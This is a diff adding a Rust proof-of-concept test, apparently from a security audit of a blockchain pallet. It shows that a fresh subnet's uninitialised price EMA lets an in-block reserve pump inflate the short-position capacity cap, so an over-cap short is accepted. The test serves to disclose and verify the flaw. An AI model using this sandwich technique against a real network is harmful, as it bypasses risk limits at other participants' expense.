+// FINDING-02 (cold-EMA gap): on a FRESH dynamic subnet the A_EMA/price-EMA are still 0 (no init at
+// subnet creation; the migration only seeds existing subnets), so short_t_ref falls back to the LIVE,
+// in-block-manipulable reserve. The in-block capacity sandwich that `sandwich_open_cannot_breach_
+// capacity_cap` proves IMPOSSIBLE on a warm subnet (T_ref pinned to the lagged A_EMA) SUCCEEDS here.
+#[test]
+fn poc_cold_ema_breaches_capacity_cap() {
+    new_test_ext(1).execute_with(|| {
+        let netuid = add_dynamic_network(&U256::from(2), &U256::from(1));
+        setup_reserves(netuid, t(1500 * TAO), AlphaBalance::from(1000 * TAO));
+        let sa = SubtensorModule::get_subnet_account_id(netuid).unwrap();
+        add_balance_to_coldkey_account(&sa, t(1_000_000 * TAO));
+        SubtensorModule::set_shorts_enabled(true);
+        SubtensorModule::set_short_kappa_ppb(80_000_000); // κ = 0.08
+        assert_eq!(SubtensorModule::get_moving_alpha_price(netuid), 0); // COLD ⇒ T_ref = t_live
+
+        let honest_cap = SubtensorModule::get_subnet_short_state(netuid).unwrap().footprint_cap.to_u64();
+        let p = t(200 * TAO);
+        let trader = U256::from(10);
+        add_balance_to_coldkey_account(&trader, t(2_000_000 * TAO));
+
+        // CONTROL: at the honest reserve the open exceeds κ·T_ref ⇒ rejected.
+        assert_noop!(
+            SubtensorModule::open_short(RuntimeOrigin::signed(trader), U256::from(11), netuid, p, None),
+            Error::<Test>::ShortCapacityExceeded
+        );
+
+        // SANDWICH: pump the live TAO reserve in-block. No lagged A_EMA to pin T_ref on a cold subnet,
+        // so T_ref tracks the pumped reserve and the cap inflates.
+        setup_reserves(netuid, t(5000 * TAO), AlphaBalance::from(1000 * TAO));
+        let pumped_cap = SubtensorModule::get_subnet_short_state(netuid).unwrap().footprint_cap.to_u64();
+        println!("[COLD-EMA] honest cap = {} TAO -> pumped cap = {} TAO", honest_cap / TAO, pumped_cap / TAO);
+        assert!(pumped_cap > honest_cap, "cold T_ref must track the live pump");
+
+        // The SAME over-cap open now SUCCEEDS — risk-limit bypass via the cold-EMA fallback.
+        assert_ok!(SubtensorModule::open_short(RuntimeOrigin::signed(trader), U256::from(11), netuid, p, None));
+        assert!(ShortPositions::<Test>::get(netuid, trader).is_some());
+    });
+}
